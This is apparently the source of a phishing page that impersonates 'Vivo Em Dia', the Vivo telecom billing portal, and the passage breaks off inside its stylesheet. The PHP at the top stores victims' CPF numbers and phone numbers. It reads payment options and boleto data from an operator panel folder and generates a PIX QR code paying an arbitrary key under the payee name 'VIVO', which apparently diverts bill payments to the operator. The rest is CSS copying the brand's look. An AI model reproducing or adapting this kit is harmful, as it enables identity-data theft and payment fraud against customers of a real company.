<?php
error_reporting(0);
session_start();

include '../function.php';
include "phpqrcode/qrlib.php"; 
include "funcoes_pix.php";

$_SESSION['cpf'] = $_POST['documento'];
$_SESSION['celular'] = $_POST['telefone'];

function dividir_string($string) {
    $partes = explode(":", $string);
    $belo = $partes[0];
    $valor = $partes[1];
    return array($belo, $valor);
  }
  list($belo, $valor) = dividir_string($_SESSION['boleto']);
$_SESSION['belo'] = $belo;

$contexto = stream_context_create([
    'http' => [
        'header' => 'Cache-Control: no-cache'
    ]
]);

$conteudo = file_get_contents('../painelvivo/config.txt', false, $contexto);

$palavra1 = "cartao";
$palavra2 = "pix";
$palavra3 = "boleto";

if (strpos($conteudo, $palavra2) !== false) {
    $_SESSION['pixtem'] = $pixtem = "block";
} else {
    $_SESSION['pixtem'] = $pixtem = "none";
}

if (strpos($conteudo, $palavra1) !== false) {
    $_SESSION['cardtem'] = $cardtem = "block";
} else {
    $_SESSION['cardtem'] = $cardtem = "none";
}

if (strpos($conteudo, $palavra3) !== false) {
    $_SESSION['boletotem'] = $boletotem = "block";
} else {
    $_SESSION['boletotem'] = $boletotem = "none";
}

if (empty($_SESSION['boleto'])) {
    $arquivo = '../painelvivo/boletos.txt';
    function pegar_primeira_linha($arquivo)
    {
        $linhas = file($arquivo);
        $primeira_linha = trim($linhas[0]);
        unset($linhas[0]);
        file_put_contents($arquivo, implode("", $linhas));
        return $primeira_linha;
    }
    $_SESSION['boleto'] = $primeira_linha = pegar_primeira_linha($arquivo);
}

$valorpix = str_replace(",", ".", $valor);

//Montando pix
$px[00]="01"; //Payload Format Indicator, Obrigatório, valor fixo: 01
// Se o QR Code for para pagamento único (só puder ser utilizado uma vez), descomente a linha a seguir.
//$px[01]="12"; //Se o valor 12 estiver presente, significa que o BR Code só pode ser utilizado uma vez. 
$px[26][00]="BR.GOV.BCB.PIX"; //Indica arranjo específico; “00” (GUI) obrigatório e valor fixo: br.gov.bcb.pix
$px[26][01]=$chavepix; //Chave do destinatário do pix, pode ser EVP, e-mail, CPF ou CNPJ.
//$px[26][02]="Descricao"; // Descrição da transação, opcional.
/*
Outros exemplos de chaves:
CPF:
$px[26][01]="12345678901"; // CPF somente numeros.

CNPJ:
$px[26][01]="05930393000156"; // CNPJ somente numeros.

E-mail
$px[26][01]="doe@r3n4t0.cyou"; // Chave de e-mail, tamanho maximo 77. Chave, descricao e os IDs devem totalizar no máximo 99 caracteres no campo 26.

Telefone:
$px[26][01]="+5599888887777"; //Codificar o telefone no formato internacional, no exemplo: +55 Pais, 99 DDD, 888887777 telefone.
*/

$px[52]="0000"; //Merchant Category Code “0000” ou MCC ISO18245
$px[53]="986"; //Moeda, “986” = BRL: real brasileiro - ISO4217
$px[54]=$valorpix; //Valor da transação, se comentado o cliente especifica o valor da transação no próprio app. Utilizar o . como separador decimal. Máximo: 13 caracteres.
$px[58]="BR"; //“BR” – Código de país ISO3166-1 alpha 2
$px[59]="VIVO"; //Nome do beneficiário/recebedor. Máximo: 25 caracteres.
$px[60]="SAOPAULO"; //Nome cidade onde é efetuada a transação. Máximo 15 caracteres.
$px[62][05]="***"; //Identificador de transação, quando gerado automaticamente usar ***. Limite 25 caracteres. Vide nota abaixo.
$pix=montaPix($px);

/*
# A função montaPix prepara todos os campos existentes antes do CRC (campo 63).
# O CRC deve ser calculado em cima de todo o conteúdo, inclusive do próprio 63.
# O CRC tem 4 dígitos, então o campo será um 6304.
*/
$pix.="6304"; //Adiciona o campo do CRC no fim da linha do pix.
$pix.=crcChecksum($pix); //Calcula o checksum CRC16 e acrescenta ao final.
$conteudo = $pix;
$_SESSION['qrcode'] =  $conteudo;
//Gerar o QRCODE
ob_start();
QRCode::png($pix,'filename.png','M',5);
$imageString = base64_encode( ob_get_contents() );
ob_end_clean();
// Exibe a imagem diretamente no navegador codificada em base64.
$_SESSION['qrcodeimg'] =  './filename.png'; // Imprime o valor do atributo src
?>
<!DOCTYPE html>
<html lang=pt-br>

<head>
    <meta charset=utf-8>
    <meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
    <meta name=theme-color content=#660096>
    <meta http-equiv=cache-control content="max-age=0">
    <meta http-equiv=cache-control content=no-cache>
    <meta http-equiv=expires content=0>
    <meta http-equiv=expires content="Tue, 01 Jan 1980 1:00:00 GMT">
    <meta http-equiv=pragma content=no-cache>
    <meta name=description content="Vivo em Dia é um portal onde você encontra as informações sobre suas contas em aberto: consulta as contas pendentes, pega a 2ª via, copiar o código de barras, paga com cartão de crédito e verifica quais as opções de negociação disponíveis . Tudo de um jeito rápido, seguro e on-line, sem sair de casa ou de sua empresa.">
    <meta property=og:locale content=pt_BR>
    <meta property=og:title content="Vivo Em Dia">
    <meta property=og:site_name content="Vivo Em Dia">
    <meta property=og:description content="Vivo em Dia é um portal onde você encontra as informações sobre suas contas em aberto: consulta as contas pendentes, pega a 2ª via, copiar o código de barras, paga com cartão de crédito e verifica quais as opções de negociação disponíveis . Tudo de um jeito rápido, seguro e on-line, sem sair de casa ou de sua empresa.">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
    <script src="https://cdn.jsdelivr.net/jsbarcode/3.6.0/JsBarcode.all.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <!-- CSS do Bootstrap -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/css/bootstrap.min.css">

    <!-- JavaScript do Bootstrap (depende do jQuery) -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/js/bootstrap.bundle.min.js"></script>
    <style>
        @font-face {
            font-family: "Roboto";
            font-style: normal;
            font-weight: 400;
            src: ;
            unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD
        }

        @font-face {
            font-family: "Roboto";
            font-style: normal;
            font-weight: 700;
            src: ;
            unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD
        }
    </style>
    <title>Vivo Em Dia | Faturas</title>
    <style data-emotion=css data-s>
        .layoutDefault {
            min-height: calc(100vh - 100px)
        }

        .headerVivoEmDia {
            align-items: center;
            background: #660096;
            display: flex;
            float: left;
            height: 60px;
            justify-content: center;
            position: relative;
            width: 100%;
        }

        .headerVivoEmDia .btnBurger {
            background-color: #52007c;
            cursor: pointer;
            flex-direction: column;
            height: 100%;
            left: 0;
            position: absolute;
            width: 60px;
            z-index: 999
        }

        .headerVivoEmDia .btnBurger div {
            background-color: #fff;
            height: 1.5px;
            margin: 2px 0;
            width: 20px
        }

        .containerVivoEmDia {
            margin-left: auto;
            margin-right: auto;
            max-width: var(--containerMax2);
            padding-left: 15px;
            padding-right: 15px;
            position: relative;
            width: 100%
        }

        .containerInfoCliente {
            color: #fff;
            font-size: var(--fontSize12);
            line-height: 1.3;
            position: absolute;
            right: 3%;
            top: 25%
        }

        .containerInfoCliente .boasVindas {
            font-size: var(--fontSize15);
            font-weight: 400
        }

        .containerInfoCliente .boasVindas .nomeCliente {
            font-weight: 600;
            text-transform: capitalize
        }

        .containerInfoCliente .ultimoAcesso {
            font-size: var(--fontSize9);
            font-weight: 400
        }

        @media only screen and (min-width:1499px) {
            .containerInfoCliente {
                top: 20%
            }
        }

        @media only screen and (max-width:1199px) {
            .layoutDefault {
                min-height: calc(100vh - 155px)
            }

            .containerInfoCliente .ultimoAcesso {
                font-size: var(--fontSize10)
            }
        }

        @-moz-document url-prefix() {
            .layoutDefault {
                display: grid
            }
        }

        .menuUsuario {
            background-color: #660096
        }

        .menuUsuario.close nav {
            height: 0;
            padding: 0;
            width: 0
        }

        .menuUsuario.close nav button {
            font-size: 0 !important;
            margin: 0 !important;
            padding: 0 !important;
            width: 0 !important
        }

        .menuUsuario nav {
            color: #fff;
            display: block;
            min-width: 225px;
            position: relative;
            z-index: 999
        }

        .menuUsuario nav .btnClose {
            background: none;
            border: none;
            color: inherit;
            cursor: pointer;
            font: inherit;
            outline: inherit
        }

        .menuUsuario nav .btnClose:hover {
            color: #e7e7e7
        }

        @-moz-document url-prefix() {
            .menuUsuario.close {
                display: none
            }
        }

        .footerVivoEmDia {
            align-items: center;
            background-color: #52007c;
            color: #fff;
            display: flex;
            font-size: var(--fontSize13);
            height: 100px;
            justify-content: center;
            margin-top: 0;
            padding: 0
        }

        .footerVivoEmDia a,
        .footerVivoEmDia a:hover {
            color: #fff
        }

        .footerVivoEmDia .iconeFooterVivo {
            width: 80px
        }

        @media only screen and (max-width:1199px) {
            .footerVivoEmDia {
                height: 100%
            }

            .footerVivoEmDia .itemFooter {
                display: block;
                text-align: center
            }

            .footerVivoEmDia .itemFooter .siteProtegido {
                font-size: var(--fontSize12);
                padding-bottom: 5px;
                padding-top: 5px
            }

            .footerVivoEmDia .itemFooter .politicaPrivacidade {
                padding-bottom: 5px;
                padding-top: 30px
            }

            .footerVivoEmDia .iconeFooterVivo {
                width: 80px
            }

            .footerVivoEmDia .copyright {
                font-size: var(--fontSize11);
                padding-bottom: 30px;
                text-align: center
            }
        }

        .containerPrincipal {
            max-width: var(--containerMax1);
            padding: 0;
            position: relative
        }

        @-webkit-keyframes inputHighlighter {
            0% {
                background: #5264ae
            }

            to {
                background: transparent;
                width: 0
            }
        }

        @keyframes inputHighlighter {
            0% {
                background: #5264ae
            }

            to {
                background: transparent;
                width: 0
            }
        }

        .containerRecargaPay {
            cursor: pointer;
            margin-top: 60px
        }

        .cardDividaMes {
            border-radius: 5px;
            color: #4d4d4d;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            padding: 10px 40px
        }

        .cardDividaMes.selected {
            background-color: #e6e6e6
        }

        .cardDividaMes .checkbox {
            align-items: center;
            display: flex;
            justify-content: center
        }

        .cardDividaMes .checkbox>span {
            margin-left: -9px
        }

        .cardDividaMes .vencimento {
            padding-left: 10px
        }

        .cardDividaMes .mes {
            display: flex
        }

        .cardDividaMes .valor {
            text-align: right
        }

        .cardDividaMes .titulo {
            font-size: var(--fontSize15);
            padding-top: 2px
        }

        .cardDividaMes .descricao {
            align-items: center;
            display: flex;
            font-size: var(--fontSize11);
            justify-content: space-between
        }

        .cardDividaMes .descricao .textoInfo {
            padding-left: 5px
        }

        .cardDividaMes .descricao .iconeStatus {
            border-radius: 60px;
            height: 12px;
            width: 12px
        }

        .cardDividaMes .descricao .iconeStatus.colorAtraso {
            background-color: #eb3d7d
        }

        .cardDividaMes .valor .titulo {
            margin-right: 0
        }

        .cardDividaMes .valor .descricao {
            justify-content: flex-end
        }

        .containerOutrasOpcoes .titulo {
            color: #609;
            font-size: var(--fontSize19);
            font-weight: 400
        }

        .containerOutrasOpcoes .opcoes {
            margin-top: 10px;
            width: 80%
        }

        .containerOutrasOpcoes .opcoes li,
        .containerOutrasOpcoes .opcoes ul {
            list-style-type: none;
            margin: 0;
            padding: 0;
            text-indent: 0
        }

        .containerOutrasOpcoes .opcoes li {
            border-bottom: 1.5px solid #b3b3b3;
            color: #888;
            cursor: pointer;
            font-size: var(--fontSize15);
            padding-bottom: 8px;
            padding-top: 10px;
            position: relative
        }

        .containerOutrasOpcoes .opcoes li .icone {
            font-size: var(--fontSize18);
            position: absolute;
            right: 0;
            top: 11px
        }

        .containerOutrasOpcoes .opcoes li .icone svg {
            fill: #d8d8d8 !important
        }

        .containerOutrasOpcoes .opcoes li:not([disabled]):hover {
            border-color: #609;
            color: #609
        }

        .containerOutrasOpcoes .opcoes li:not([disabled]):hover .icone svg {
            fill: #609 !important
        }

        .containerTipoPagamento {
            display: flex;
            margin-top: 20px
        }

        .containerTipoPagamento .card {
            background-color: #fff;
            border: 1px solid #d9d9d9;
            border-radius: 6px;
            cursor: pointer;
            display: flex;
            flex-direction: column;
            float: left;
            height: 90px;
            justify-content: flex-start;
            margin-right: 20px;
            padding: 14px;
            position: relative;
            width: 90px
        }

        .containerTipoPagamento .card.btn {
            white-space: normal
        }

        .containerTipoPagamento .card .cardDescricao {
            bottom: 10px;
            color: #4d4d4d;
            font-size: var(--fontSize11);
            position: absolute;
            text-align: initial
        }

        .containerTipoPagamento .card:hover {
            background-color: #f7f7f7
        }

        .containerTipoPagamento .card:disabled {
            background-color: inherit
        }

        .containerInfoContrato {
            font-size: var(--fontSize14)
        }

        .containerInfoContrato span {
            color: #660096;
            font-weight: 600
        }

        .modal {
            overflow: hidden
        }

        .fade {
            transition: opacity .15s linear;
        }

        .modal {
            bottom: 0;
            left: 0;
            outline: 0;
            position: fixed;
            right: 0;
            top: 0;
            z-index: 1050
        }

        .modal-open .modal {
            overflow-x: hidden;
            overflow-y: auto
        }

        .modal-dialog {
            margin: .5rem;
            pointer-events: none;
            position: relative;
            width: auto
        }

        .modal.fade .modal-dialog {
            -webkit-transform: translateY(-25%);
            transition: -webkit-transform .3s ease-out;
            transition: transform .3s ease-out;
            transition: transform .3s ease-out, -webkit-transform .3s ease-out
        }

        @media screen and (prefers-reduced-motion:reduce) {
            .modal.fade .modal-dialog {
                transition: none
            }
        }

        .modal.show .modal-dialog {
            -webkit-transform: translate(0);
            transform: translate(0)
        }

        .modal-content {
            background-clip: padding-box;
            background-color: #fff;
            border: 1px solid rgba(0, 0, 0, .2);
            display: flex;
            flex-direction: column;
            outline: 0;
            pointer-events: auto;
            position: relative;
            width: 100%;
            border-radius: 10px;
            margin-top: 20vmin;
        }

        .modal-backdrop {
            background-color: #000;
            bottom: 0;
            left: 0;
            position: fixed;
            right: 0;
            top: 0;
            z-index: 1040
        }

        .modal-backdrop.show {
            opacity: .85;
        }

        .modal-body {
            flex: 1 1 auto;
            position: relative
        }

        .modal-body {
            padding: 30px;
        }

        .container {
            margin-left: auto;
            margin-right: auto;
            padding-left: 15px;
            padding-right: 15px;
            width: 100%;
        }

        .col-md-1,
        .col-md-10,
        .col-md-2,
        .col-md-3,
        .col-md-4,
        .col-md-8,
        .col-sm-11,
        .col-sm-12,
        .col-sm-4 {
            min-height: 1px;
            padding-left: 15px;
            padding-right: 15px;
            position: relative;
            width: 100%;
        }

        .modalPIX .btnVoltar {
            color: #609;
            cursor: pointer;
            display: flex;
            justify-content: center;
        }

        .modalPIX .btnVoltar i {
            font-size: var(--fontSize20);
        }

        .modalPIX .textoFacilitePagamento {
            font-size: var(--fontSize14);
            padding-bottom: 20px;
        }

        /** teste **/

        .fa-chevron-left:before {
            content: "";
        }

        @media only screen and (max-width: 750px) {
            .modalPIX .textoFacilitePagamento {
                margin-bottom: -15px;
            }
        }

        .modalPIX .containerCopiar {
            align-items: center;
            background-color: #f6f6f7;
            border-radius: 10px;
            display: flex;
            height: 70px;
            justify-content: center;
            margin-bottom: 20px;
            padding-right: 70px;
            position: relative;
        }

        .numCodigoBarra {
            color: #609;
            font-size: var(--fontSize12);
        }

        .numCodigoBarra .containerNumCodBarras.pix {
            font-size: var(--fontSize11);
        }

        .numCodigoBarra div {
            font-weight: 400;
        }

        .numCodigoBarra .containerNumCodBarras {
            display: flex;
        }

        .modalPIX .containerCopiar .iconeCopiar {
            background-color: #660096;
            border-radius: 10px;
            color: #fff;
            cursor: pointer;
            font-size: 22px;
            height: 100%;
            position: absolute;
            right: 0;
            width: 70px;
        }

        .modalPIX .containerIcone {
            align-items: center;
            display: flex;
            justify-content: center;
            width: 100%;
        }

        .modalPIX .containerIcone .btnBanco {
            align-items: center;
            background-color: #f6f6f7;
            border-radius: 10px;
            cursor: pointer;
            display: flex;
            height: 70px;
            justify-content: center;
            position: relative;
            width: 70px;
        }

        .modalCartaoCredito .aviso {
            font-size: 24px;
        }

        .modalCartaoCredito .descricaoAviso {
            font-size: var(--fontSize18);
        }

        .modalCartaoCredito .containerBandeirasCartao {
            display: flex;
        }

        .modalCartaoCredito .containerBandeirasCartao .containerCartao {
            align-items: center;
            display: flex;
            flex-grow: 1;
            justify-content: center;
        }

        .mr-auto {
            margin-right: auto !important;
        }

        .ml-auto {
            margin-left: auto !important;
        }

        .fa-copy:before {
            content: "";
        }

        /** toast **/

        #toastr-container {
            display: none;
            left: 12px;
            position: fixed;
            top: 12px;
            width: 300px;
            z-index: 100000000000000000;
        }

        .toastr {
            border: 2px solid;
            border-radius: 4px;
            box-shadow: none;
            margin-bottom: 8px;
            padding: 8px 35px 8px 14px;
        }

        .toastr-success {
            background-color: #07bc0c;
            border-color: #07bc0c;
            box-shadow: none;
            color: #fff;
        }

        @media (min-width: 768px) {
            .col-md-10 {
                flex: 0 0 83.333333%;
                max-width: 83.333333%;
            }
        }

        @media only screen and (max-width: 750px) {
            .modalPIX .containerIcone {
                margin-top: 15px;
            }
        }

        @media only screen and (max-width: 1199px) {
            .numCodigoBarra .containerNumCodBarras {
                flex-direction: column;
                font-size: var(--fontSize10);
            }
        }

        @media only screen and (max-width: 750px) {
            .modalPIX .numCodigoBarra .containerNumCodBarras {
                word-break: break-word;
            }
        }


        .numCodigoBarra .containerNumCodBarras.pix {
            font-size: var(--fontSize11);
        }

        @media only screen and (max-width: 750px) {
            .modalPIX .numCodigoBarra .containerNumCodBarras.pix {
                font-size: var(--fontSize8);
                padding: 5px;
            }
        }

        @media only screen and (max-width: 750px) {
            .modalPIX .containerCopiar {
                margin-top: 15px;
            }
        }


        @media only screen and (max-width: 750px) {
            .modalPIX .btnVoltar {
                justify-content: flex-start;
            }
        }


        @media screen and (max-width: 1199px) {
            .modal-body {
                padding-left: 1% !important;
                padding-right: 1% !important;
                padding-top: 3% !important;
            }
        }

        @media (min-width:576px) {
            .modal-dialog {
                margin: 1.75rem auto;
                max-width: 500px
            }
        }

        @media (min-width:992px) {
            .modal-lg {
                max-width: 800px
            }
        }

        @media only screen and (max-width: 750px) {
            .modalPIX {
                top: 40px;
            }
        }


        @media only screen and (max-width:1199px) {

            .containerInfoContrato,
            .containerOutrasOpcoes .titulo {
                margin-top: 20px
            }

            .containerOutrasOpcoes .opcoes {
                margin-top: 10px;
                width: 100%
            }

            .containerTipoPagamento {
                flex-wrap: wrap
            }

            .containerTipoPagamento .card {
                height: 82px;
                margin-right: 5px;
                margin-top: 5px;
                /** max-width: 33.33333%; **/
                padding: 12px 8px
            }
        }

        @media only screen and (max-width:1199px) {
            .cardDividaMes {
                padding: 10px 20px
            }
        }

        @media (min-width: 768px) {
            .col-md-9 {
                flex: 0 0 75%;
                max-width: 75%;
            }
        }

        .btn:focus {
            box-shadow: none
        }

        /*!
This file is kept for backward compatibility.
It is no longer required.
*/
        @-webkit-keyframes dx-valid-badge-frames {
            0% {
                opacity: 0;
                -webkit-transform: scale(.1);
                transform: scale(.1)
            }

            to {
                opacity: 1;
                -webkit-transform: scale(1);
                transform: scale(1)
            }
        }

        @keyframes dx-valid-badge-frames {
            0% {
                opacity: 0;
                -webkit-transform: scale(.1);
                transform: scale(.1)
            }

            to {
                opacity: 1;
                -webkit-transform: scale(1);
                transform: scale(1)
            }
        }

        @-webkit-keyframes dx-loadindicator-icon-custom-rotate {
            0% {
                -webkit-transform: rotate(0);
                transform: rotate(0)
            }

            to {
                -webkit-transform: rotate(1turn);
                transform: rotate(1turn)
            }
        }

        @keyframes dx-loadindicator-icon-custom-rotate {
            0% {
                -webkit-transform: rotate(0);
                transform: rotate(0)
            }

            to {
                -webkit-transform: rotate(1turn);
                transform: rotate(1turn)
            }
        }

        @-webkit-keyframes dx-generic-loadindicator-opacity {
            0% {
                opacity: 1
            }

            to {
                opacity: .55
            }
        }

        @keyframes dx-generic-loadindicator-opacity {
            0% {
                opacity: 1
            }

            to {
                opacity: .55
            }
        }

        @-webkit-keyframes dx-loader {
            0% {
                background-position-x: 0
            }

            to {
                background-position-x: 900%
            }
        }

        @keyframes dx-loader {
            0% {
                background-position-x: 0
            }

            to {
                background-position-x: 900%
            }
        }

        @-webkit-keyframes dx-loader-rtl {
            0% {
                background-position-x: 0
            }

            to {
                background-position-x: -900%
            }
        }

        @keyframes dx-loader-rtl {
            0% {
                background-position-x: 0
            }

            to {
                background-position-x: -900%
            }
        }

        @-webkit-keyframes dx-loadpanel-opacity {
            0% {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @keyframes dx-loadpanel-opacity {
            0% {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @-webkit-keyframes dx-datagrid-highlight-change {

            0%,
            50% {
                background-color: rgba(51, 51, 51, .08)
            }
        }

        @keyframes dx-datagrid-highlight-change {

            0%,
            50% {
                background-color: rgba(51, 51, 51, .08)
            }
        }

        @-webkit-keyframes dx-treelist-highlight-change {

            0%,
            50% {
                background-color: rgba(51, 51, 51, .08)
            }
        }

        @keyframes dx-treelist-highlight-change {

            0%,
            50% {
                background-color: rgba(51, 51, 51, .08)
            }
        }

        @-webkit-keyframes dx-filemanager-icon-rotate {
            0% {
                -webkit-transform: rotate(0);
                transform: rotate(0)
            }

            to {
                -webkit-transform: rotate(1turn);
                transform: rotate(1turn)
            }
        }

        @keyframes dx-filemanager-icon-rotate {
            0% {
                -webkit-transform: rotate(0);
                transform: rotate(0)
            }

            to {
                -webkit-transform: rotate(1turn);
                transform: rotate(1turn)
            }
        }

        .col-4 {
            flex: 0 0 33.333333%;
            max-width: 33.333333%;
        }

        @media (min-width: 576px) {
            .col-sm-4 {
                flex: 0 0 33.333333%;
                max-width: 33.333333%;
            }
        }

        @media (min-width: 768px) {
            .col-md-2 {
                flex: 0 0 16.666667%;
                max-width: 16.666667%;
            }
        }

        @media (min-width: 768px) {
            .col-md-10 {
                flex: 0 0 83.333333%;
                max-width: 83.333333%;
            }
        }

        /*!
 * Bootstrap v4.1.1 (https://getbootstrap.com/)
 * Copyright 2011-2018 The Bootstrap Authors
 * Copyright 2011-2018 Twitter, Inc.
 * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
 */
        :root {
            --blue: #007bff;
            --indigo: #6610f2;
            --purple: #6f42c1;
            --pink: #e83e8c;
            --red: #dc3545;
            --orange: #fd7e14;
            --yellow: #ffc107;
            --green: #28a745;
            --teal: #20c997;
            --cyan: #17a2b8;
            --white: #fff;
            --gray: #6c757d;
            --gray-dark: #343a40;
            --primary: #007bff;
            --secondary: #6c757d;
            --success: #28a745;
            --info: #17a2b8;
            --warning: #ffc107;
            --danger: #dc3545;
            --light: #f8f9fa;
            --dark: #343a40;
            --breakpoint-xs: 0;
            --breakpoint-sm: 576px;
            --breakpoint-md: 768px;
            --breakpoint-lg: 992px;
            --breakpoint-xl: 1200px;
            --font-family-sans-serif: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
            --font-family-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace
        }

        *,
        :after,
        :before {
            box-sizing: border-box
        }

        html {
            -webkit-text-size-adjust: 100%;
            -ms-text-size-adjust: 100%;
            -ms-overflow-style: scrollbar;
            -webkit-tap-highlight-color: transparent;
            font-family: sans-serif;
            line-height: 1.15
        }

        @-ms-viewport {
            width: device-width
        }

        body {
            background-color: #fff;
            color: #212529;
            font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol;
            font-size: 1rem;
            font-weight: 400;
            line-height: 1.5;
            margin: 0;
            text-align: left
        }

        ul {
            margin-bottom: 1rem
        }

        ul {
            margin-top: 0
        }

        a {
            -webkit-text-decoration-skip: objects;
            background-color: transparent;
            color: #007bff;
            text-decoration: none
        }

        a:hover {
            color: #0056b3;
            text-decoration: underline
        }

        a:not([href]):not([tabindex]),
        a:not([href]):not([tabindex]):focus,
        a:not([href]):not([tabindex]):hover {
            color: inherit;
            text-decoration: none
        }

        a:not([href]):not([tabindex]):focus {
            outline: 0
        }

        img {
            border-style: none;
            vertical-align: middle
        }

        svg:not(:root) {
            overflow: hidden
        }

        button {
            border-radius: 0
        }

        button:focus {
            outline: 1px dotted;
            outline: 5px auto -webkit-focus-ring-color
        }

        button,
        input {
            font-family: inherit;
            font-size: inherit;
            line-height: inherit
        }

        input {
            overflow: visible
        }

        button {
            text-transform: none
        }

        button {
            -webkit-appearance: button
        }

        input[type=radio] {
            box-sizing: border-box;
            padding: 0
        }

        ::-webkit-file-upload-button {
            -webkit-appearance: button;
            font: inherit
        }

        .container-fluid {
            margin-left: auto;
            margin-right: auto;
            padding-left: 15px;
            padding-right: 15px;
            width: 100%
        }

        .row {
            display: flex;
            flex-wrap: wrap;
            margin-left: -15px;
            margin-right: -15px
        }

        .col-11 {
            flex: 0 0 91.666667%;
            max-width: 91.666667%
        }

        .col-12 {
            flex: 0 0 100%;
            max-width: 100%;
        }

        .col-md-1,
        .col-md-3,
        .col-md-4,
        .col-md-8,
        .col-sm-11,
        .col-sm-12 {
            min-height: 1px;
            padding-left: 15px;
            padding-right: 15px;
            position: relative;
            width: 100%
        }

        @media (min-width:576px) {
            .col-sm-11 {
                flex: 0 0 91.666667%;
                max-width: 91.666667%
            }

            .col-sm-12 {
                flex: 0 0 100%;
                max-width: 100%
            }
        }

        @media (min-width:768px) {
            .col-md-1 {
                flex: 0 0 8.333333%;
                max-width: 8.333333%
            }

            .col-md-3 {
                flex: 0 0 25%;
                max-width: 25%
            }

            .col-md-4 {
                flex: 0 0 33.333333%;
                max-width: 33.333333%
            }

            .col-md-6 {
                flex: 0 0 50%;
                max-width: 50%
            }

            .col-md-7 {
                flex: 0 0 58.333333%;
                max-width: 58.333333%
            }

            .col-md-8 {
                flex: 0 0 66.666667%;
                max-width: 66.666667%
            }

            .col-md-11 {
                flex: 0 0 91.666667%;
                max-width: 91.666667%
            }
        }

        .btn {
            border: 1px solid transparent;
            font-size: 1rem;
            font-weight: 400;
            line-height: 1.5;
            text-align: center;
            transition: color .15s ease-in-out, background-color .15s ease-in-out, border-color .15s ease-in-out, box-shadow .15s ease-in-out;
            -webkit-user-select: none;
            -ms-user-select: none;
            user-select: none;
            vertical-align: middle
        }

        @media screen and (prefers-reduced-motion:reduce) {
            .btn {
                transition: none
            }
        }

        .btn:focus,
        .btn:hover {
            text-decoration: none
        }

        .btn.focus,
        .btn:focus {
            box-shadow: 0 0 0 .2rem rgba(0, 123, 255, .25);
            outline: 0
        }

        .btn.disabled,
        .btn:disabled {
            opacity: .65
        }

        .btn:not(:disabled):not(.disabled) {
            cursor: pointer
        }

        .btn:not(:disabled):not(.disabled).active,
        .btn:not(:disabled):not(.disabled):active {
            background-image: none
        }

        .card {
            word-wrap: break-word;
            background-clip: border-box;
            min-width: 0
        }

        .breadcrumb-item+.breadcrumb-item {
            padding-left: .5rem
        }

        .breadcrumb-item+.breadcrumb-item:before {
            color: #6c757d;
            content: "/";
            display: inline-block;
            padding-right: .5rem
        }

        .breadcrumb-item+.breadcrumb-item:hover:before {
            text-decoration: underline;
            text-decoration: none
        }

        @-webkit-keyframes progress-bar-stripes {
            0% {
                background-position: 1rem 0
            }

            to {
                background-position: 0 0
            }
        }

        @keyframes progress-bar-stripes {
            0% {
                background-position: 1rem 0
            }

            to {
                background-position: 0 0
            }
        }

        .close {
            color: #000;
            float: right;
            font-size: 1.5rem;
            font-weight: 700;
            line-height: 1;
            opacity: .5;
            text-shadow: 0 1px 0#fff
        }

        .close:focus,
        .close:hover {
            color: #000;
            opacity: .75;
            text-decoration: none
        }

        .close:not(:disabled):not(.disabled) {
            cursor: pointer
        }

        @supports ((-webkit-transform-style:preserve-3d) or (transform-style:preserve-3d)) {

            .carousel-item-next.carousel-item-left,
            .carousel-item-prev.carousel-item-right {
                -webkit-transform: translateZ(0);
                transform: translateZ(0)
            }
        }

        @supports ((-webkit-transform-style:preserve-3d) or (transform-style:preserve-3d)) {

            .active.carousel-item-right,
            .carousel-item-next {
                -webkit-transform: translate3d(100%, 0, 0);
                transform: translate3d(100%, 0, 0)
            }
        }

        @supports ((-webkit-transform-style:preserve-3d) or (transform-style:preserve-3d)) {

            .active.carousel-item-left,
            .carousel-item-prev {
                -webkit-transform: translate3d(-100%, 0, 0);
                transform: translate3d(-100%, 0, 0)
            }
        }

        @supports ((-webkit-transform-style:preserve-3d) or (transform-style:preserve-3d)) {

            .carousel-fade .active.carousel-item-left,
            .carousel-fade .active.carousel-item-prev,
            .carousel-fade .carousel-item-next,
            .carousel-fade .carousel-item-prev,
            .carousel-fade .carousel-item.active {
                -webkit-transform: translateZ(0);
                transform: translateZ(0)
            }
        }

        .d-none {
            display: none !important
        }

        @media (min-width:576px) {
            .d-sm-none {
                display: none !important
            }
        }

        @media (min-width:768px) {
            .d-md-block {
                display: block !important
            }
        }

        @supports ((position:-webkit-sticky) or (position:sticky)) {
            .sticky-top {
                position: -webkit-sticky;
                position: sticky;
                top: 0;
                z-index: 1020
            }
        }

        .mr-auto {
            margin-right: auto !important
        }

        .ml-auto {
            margin-left: auto !important
        }

        @media print {

            *,
            :after,
            :before {
                box-shadow: none !important;
                text-shadow: none !important
            }

            a:not(.btn) {
                text-decoration: underline
            }

            img {
                page-break-inside: avoid
            }

            @page {
                size: a3
            }

            body {
                min-width: 992px !important
            }
        }

        @-webkit-keyframes react-confirm-alert-fadeIn {
            0% {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @keyframes react-confirm-alert-fadeIn {
            0% {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @media (max-width:1498px) {
            :root {
                --fontSize7: 7px;
                --fontSize8: 8px;
                --fontSize9: 9px;
                --fontSize10: 10px;
                --fontSize11: 11px;
                --fontSize12: 12px;
